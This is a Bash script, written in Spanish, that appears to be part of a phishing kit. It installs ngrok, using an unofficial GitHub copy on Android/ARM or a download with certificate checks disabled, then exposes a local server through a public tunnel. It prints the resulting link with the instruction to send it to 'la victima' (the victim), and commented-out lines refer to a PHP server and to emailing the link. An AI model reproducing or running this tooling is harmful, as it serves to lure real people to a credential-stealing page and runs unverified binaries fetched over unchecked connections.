
#!/bin/bash
trap 'printf "\n";stop;exit 1' 2


link="localhost:8080"
v="\e[1;91m"
b="\e[1;39m"
r="\e[1;91m"

ngrok(){
echo
#php -S $link > /dev/null 2>&1 &
echo -e "$v[$b*$v]$b Enpezando..."
sleep 2

findngrok
./ngrok http $link > /dev/null 2>&1 &
echo -e "$v[$b*$v]$b Verifica una buena conexión de internet"
sleep 7
echo -e "$v[$b*$v]$b Abriendo ngrok..."
sleep 7
echo -e "$v[$b*$v]$b Obteniendo links..."
sleep 7
envialink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
if [[ $envialink == "" ]];then
echo -e "$r[!]$b No se pudo conectar, prueba otro servidor"
exit 1
else
echo -e "$v[$b*$v]$b $link"
echo -e "$v[$b*$v]$b Envia a la victima > \e[0;32m$envialink"
fi
#cd $ruta_carpeta

# cutt
# if [[ $add7 == "7" ]];then
# echo -e "$v[$b*$v]$b Enviando email..."
# fi
# check
# check_found

}


findngrok(){
if [[ -f ngrok ]];then
jajaj="g"
else
command -v git > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando git..."; pkg install git -y;}
ar=$(uname -a | grep -o 'arm' | head -n1)
ar2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $ar == *'arm'* ]] || [[ $ar2 == *'Android'* ]] ; then
echo -e "$v[*]$b Instalando ngrok..."
git clone https://github.com/HarrisSec/best-ngrok
cd best-ngrok
mv ngrok $OLDPWD
cd $OLDPWD
if [[ -d best-ngrok ]];then
rm -rf best-ngrok
else
echo -e "$r[!]$b Comprueba tu conexión."
exit 1
fi

else
echo -e "$v[*]$b Instalando ngrok..."
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
echo -e "$r[!]$b Comprueba tu conexión."
exit 1
fi

fi

fi

}
stop() {
checkng=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkng == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
}

"$@"
